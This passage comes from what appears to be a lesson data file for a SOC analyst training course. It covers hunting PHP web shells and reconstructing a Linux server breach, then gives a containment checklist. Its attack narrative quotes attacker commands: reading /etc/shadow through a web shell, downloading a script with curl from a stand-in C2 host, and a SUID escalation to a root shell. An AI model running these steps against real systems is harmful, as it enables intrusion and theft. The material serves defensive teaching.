When an attacker visits \`http://target.com/shell.php?cmd=cat+/etc/shadow\`, the web server executes the command as user \`www-data\` and prints the output directly on the webpage.

### Forensic Commands to Hunt Web Shells:
\`\`\`bash
# 1. Search for suspicious PHP execution functions in web directories:
grep -rEi --include="*.php" "(eval|shell_exec|passthru|system|base64_decode)" /var/www/html/

# 2. Find all web files modified in the last 24 hours:
find /var/www/html/ -type f -name "*.php" -mtime -1

# 3. Inspect Apache/Nginx access logs for POST requests to unusual PHP files:
grep "POST " /var/log/apache2/access.log | awk '{print $1, $7, $9}'
\`\`\``,
        key_concept_bullets: [
          'Web shells execute under the web server user account (e.g. \`www-data\` or \`nginx\`).',
          'Hunt for dangerous execution functions (\`eval\`, \`shell_exec\`, \`base64_decode\`).',
          'Use \`find -mtime\` to identify newly uploaded or modified files matching the incident window.'
        ],
        analyst_takeaway: 'When a web shell is discovered, check \`/var/log/nginx/access.log\` for the exact client IP that made the first POST request to that file—that is your threat actor IP.'
      }
    ]
  },

  // LEVEL 28: LINUX SECURITY MILESTONE ASSESSMENT
  28: {
    level_id: 28,
    title: 'Linux Security Milestone: End-to-End Production Server Breach Investigation',
    module_name: 'Module 3 — Linux Fundamentals',
    difficulty: 'Advanced',
    estimated_study_time: '30 Minutes (Milestone Scenario Evaluation)',
    prerequisites: ['Levels 21–27 (All Linux Fundamentals Modules)'],
    sections: [
      {
        id: 'l28-sec1',
        chapter_number: 1,
        title: 'Full Linux Intrusion Lifecycle: From Web Upload to Root Compromise',
        subtitle: 'Analyzing the complete multi-stage cyber attack chain on a production node',
        badge: 'ATTACK RECONSTRUCTION',
        reading_minutes: 5,
        content_markdown: `In this milestone scenario, an e-commerce database server running Ubuntu was compromised. Let us trace the complete adversarial kill chain:

\`\`\`
[ Stage 1: Initial Access ]
  Adversary exploits unvalidated file upload in WordPress.
  Drops web shell \`/var/www/html/wp-content/uploads/cache.php\`.
  User context: \`www-data\`.
        │
        ▼
[ Stage 2: Reconnaissance & Tool Staging ]
  Attacker executes \`curl http://c2.io/linpeas.sh -o /tmp/lp.sh\`.
  Identifies SUID permission on custom backup binary \`/opt/backup_tool\`.
        │
        ▼
[ Stage 3: Privilege Escalation to Root ]
  Attacker executes \`/opt/backup_tool -e /bin/bash\`.
  Gains full \`root\` UID 0 access.
        │
        ▼
[ Stage 4: Persistence Installation ]
  Attacker drops rogue Systemd service \`/etc/systemd/system/syscheck.service\`.
  Appends attacker public key to \`/root/.ssh/authorized_keys\`.
        │
        ▼
[ Stage 5: Lateral Movement & Exfiltration ]
  Attacker dumps database credentials from \`/var/www/html/wp-config.php\`.
  Exfiltrates customer records via encrypted HTTPS POST to external C2.
\`\`\``,
        key_concept_bullets: [
          'Linux compromises progress from low-privilege service accounts (\`www-data\`) to \`root\` via local privilege escalation.',
          'Look for file drops in \`/tmp\` followed by SUID or Sudoers exploitation.',
          'Persistence is cemented in Systemd units and \`~/.ssh/authorized_keys\`.'
        ],
        analyst_takeaway: 'In a real SOC investigation, you must systematically check: Web Logs -> Dropped Files in /tmp -> SUID usage in Auth Logs -> Systemd Persistence -> SSH Authorized Keys.'
      },
      {
        id: 'l28-sec2',
        chapter_number: 2,
        title: 'Live Triage Checklist & Containment Playbook for Linux',
        subtitle: 'Standard Operating Procedure (SOP) for containing and remediating a Linux node',
        badge: 'CONTAINMENT SOP',
        reading_minutes: 5,
        content_markdown: `When assigned a high-severity Linux breach alert, execute this immediate 6-point containment checklist:

### 1. Network Isolation:
* If EDR is installed: Send network isolation signal.
* If manual: Add immediate iptables drop rule while preserving SSH management:
  \`iptables -A INPUT -p tcp --dport 22 -s [SOC_MANAGEMENT_IP] -j ACCEPT && iptables -P INPUT DROP\`

### 2. Collect Volatile Forensics:
* Dump active network connections: \`ss -tulpn > /root/forensics_ss.txt\`
* Dump live process list: \`ps auxf > /root/forensics_ps.txt\`
* Check logged-in users: \`w\` and \`last -n 20\`

### 3. Neutralize Persistence:
* Remove rogue keys from \`/root/.ssh/authorized_keys\` and all user \`.ssh/\` directories.
* Stop and disable malicious systemd services: \`systemctl stop [service] && systemctl disable [service]\`
* Inspect and clean \`/etc/cron.*\` and user crontabs.

### 4. Eradicate Dropped Payloads:
* Delete malicious ELF binaries and web shells from \`/tmp\`, \`/dev/shm\`, and \`/var/www/html\`.

### 5. Rotate All Credentials:
* Force password changes for all system accounts.
* Rotate database and API keys stored in configuration files.`,
        key_concept_bullets: [
          'Always preserve volatile forensic evidence (connections, processes) before pulling the plug.',
          'Check both SSH authorized_keys and crontab for persistence.',
          'Rotate all application credentials stored on the compromised host.'
        ],
        analyst_takeaway: 'Congratulations on completing Module 3! You now understand the complete Linux filesystem, process hierarchy, authentication logs, and root compromise triage.'
      }
    ]
  }
};

